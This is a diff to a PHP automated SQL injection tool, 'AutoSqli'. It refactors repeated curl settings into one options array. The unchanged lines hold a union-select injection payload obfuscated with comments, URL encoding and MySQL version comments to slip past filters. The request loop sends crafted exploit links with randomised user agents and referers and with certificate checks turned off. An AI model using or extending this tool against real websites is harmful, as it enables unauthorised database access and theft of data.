@@ -1,11 +1,9 @@
 <?php
 
-// set_time_limit(0);
 require "vendor/autoload.php";
 require "uagent.php";
 require "referer.php";
 error_reporting(0);
-
 
 class AutoSqli
 {
@@ -21,17 +19,34 @@ class AutoSqli
     protected $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
     protected $number_colum        = 0;
     protected $header              = [];
+    protected $options_curl        = [];
 
     public function __construct()
     {
-        array_push($this->header, 'Connection: keep-alive');
-        array_push($this->header, 'Keep-Alive: ' . rand(110, 120));
-        array_push($this->header, 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
-        array_push($this->header, 'Upgrade-Insecure-Requests: 1');
-        array_push($this->header, 'Accept-Encoding: gzip, deflate, sdch');
-        array_push($this->header, 'Accept-Language: id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4');
-        array_push($this->header, 'Cache-Control: no-cache');
-        array_push($this->header, 'Pragma: no-cache');
+        // set header
+        $this->header = array(
+            'Connection: keep-alive',
+            'Keep-Alive: ' . rand(110, 120),
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Upgrade-Insecure-Requests: 1',
+            'Accept-Encoding: gzip, deflate, sdch',
+            'Accept-Language: id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4',
+            'Cache-Control: no-cache',
+            'Pragma: no-cache',
+
+        );
+
+        // set URL and other appropriate options
+        $this->options_curl  = array(
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_ENCODING => 'gzip',
+            CURLOPT_USERAGENT => UAgent::random(),
+            CURLOPT_REFERER => Referer::random(),
+            CURLOPT_HTTPHEADER => $this->header,
+        );
     }
 
     public function setUrl($url)
@@ -71,14 +86,7 @@ class AutoSqli
 
         foreach ($tampung_semua as $link_exp) {
             if (!$ch = curl_init($link_exp));
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-            curl_setopt($ch, CURLOPT_USERAGENT, UAgent::random());
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $this->header);
-            curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
-            curl_setopt($ch, CURLOPT_REFERER, Referer::random());
+            curl_setopt_array($ch, $this->options_curl);
             $respones = $mc->addCurl($ch);
 
             $resut = $respones->response;
@@ -119,14 +127,7 @@ class AutoSqli
 
         foreach ($tampung_semua as $link_exp) {
             if (!$ch = curl_init($link_exp));
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-            curl_setopt($ch, CURLOPT_USERAGENT, UAgent::random());
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $this->header);
-            curl_setopt($ch, CURLOPT_ENCODING, "gzip");
-            curl_setopt($ch, CURLOPT_REFERER, Referer::random());
+            curl_setopt_array($ch, $this->options_curl);
             $respones = $mc->addCurl($ch);
 
             $resut = $respones->response;
